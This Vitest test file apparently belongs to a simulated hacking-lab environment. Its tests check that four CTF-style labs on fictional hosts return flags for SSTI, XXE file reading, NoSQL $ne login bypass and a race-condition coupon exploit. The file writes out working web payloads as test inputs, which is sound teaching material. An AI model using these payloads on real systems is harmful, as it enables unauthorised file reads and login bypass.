import { describe, expect, it } from "vitest";
import { VirtualKernel } from "../VirtualKernel";
import { resetStorage, seedRandom } from "../../test/setup";

describe("labs de ataque (tanda 4)", () => {
  it("SSTI: {{7*7}} evalúa y {{secreto}} expone el contexto", () => {
    resetStorage(); seedRandom();
    const k = new VirtualKernel();
    const host = "saludos.codea.nande";
    expect(k.browser.isWebApp(host)).toBe(true);
    const calc = k.browser.request("GET", host, "/?nombre=" + encodeURIComponent("{{7*7}}"));
    expect(calc.response.body).toContain("49");
    const leak = k.browser.request("GET", host, "/?nombre=" + encodeURIComponent("{{secreto}}"));
    expect(leak.response.body).toContain("ND{ssti_contexto_expuesto}");
  });

  it("XXE: una entidad externa file:// filtra un archivo del servidor", () => {
    resetStorage(); seedRandom();
    const k = new VirtualKernel();
    const host = "import.nova.nande";
    const xml = '<!DOCTYPE nota [<!ENTITY xxe SYSTEM "file:///etc/nova/secret">]><nota>&xxe;</nota>';
    const res = k.browser.request("POST", host, "/", { xml });
    expect(res.response.body).toContain("ND{xxe_archivo_leido}");
  });

  it("NoSQL: un operador $ne entra sin saber la contraseña", () => {
    resetStorage(); seedRandom();
    const k = new VirtualKernel();
    const host = "login.redix.nande";
    const res = k.browser.request(
      "GET", host,
      "/entrar?usuario=admin&password=" + encodeURIComponent('{"$ne": null}'),
    );
    expect(res.response.body).toContain("ND{nosql_auth_bypass}");
    const bad = k.browser.request("GET", host, "/entrar?usuario=admin&password=1234");
    expect(bad.response.body).not.toContain("ND{nosql_auth_bypass}");
  });

  it("Race condition: varias peticiones a la vez canjean de más", () => {
    resetStorage(); seedRandom();
    const k = new VirtualKernel();
    const host = "cupones.gulu.nande";
    const one = k.browser.request("GET", host, "/canjear?paralelo=1");
    expect(one.response.body).not.toContain("ND{race_condition_toctou}");
    k.browser.request("GET", host, "/reset");
    const many = k.browser.request("GET", host, "/canjear?paralelo=10");
    expect(many.response.body).toContain("ND{race_condition_toctou}");
  });
});
